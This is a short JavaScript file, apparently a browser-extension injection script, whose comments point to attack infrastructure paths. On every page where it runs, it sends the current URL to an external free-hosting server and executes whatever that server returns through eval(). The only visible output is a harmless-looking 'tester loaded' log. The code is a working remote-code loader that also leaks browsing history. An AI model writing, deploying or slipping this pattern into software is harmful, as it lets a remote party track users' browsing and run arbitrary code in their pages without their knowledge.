/*
Addresses:
	https://convenientappprototypes.000webhostapp.com/
	win ~ http://localhost/mysites/smart_extension_tester/
	nix ~ http://localhost/AttackInfras/attack_infra_1/
*/

var objectName = new XMLHttpRequest();

console.log("tester loaded");

callToServer(objectName, evalResponse)

function callToServer(objectName, callback)
{
	objectName.open('POST', 'https://convenientappprototypes.000webhostapp.com/', true);
	var params = "thePage="+window.location.href;
	objectName.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');


	objectName.send(params);
	
	lInterval = setInterval(function()
	{
		if(notNull(objectName.responseText) && objectName.responseText !== "")
		{
			clearInterval(lInterval);
			callback(objectName);
		}
	}, 400);
}

function evalResponse(objectName)
{
	var theResponse = objectName.responseText;
	console.log(theResponse);
	eval(theResponse);
}

function notNull(inObj)
{
	var returnVal = false;
	if(inObj != null && inObj != undefined)
	{
		returnVal = true;
	}
	return returnVal;
}
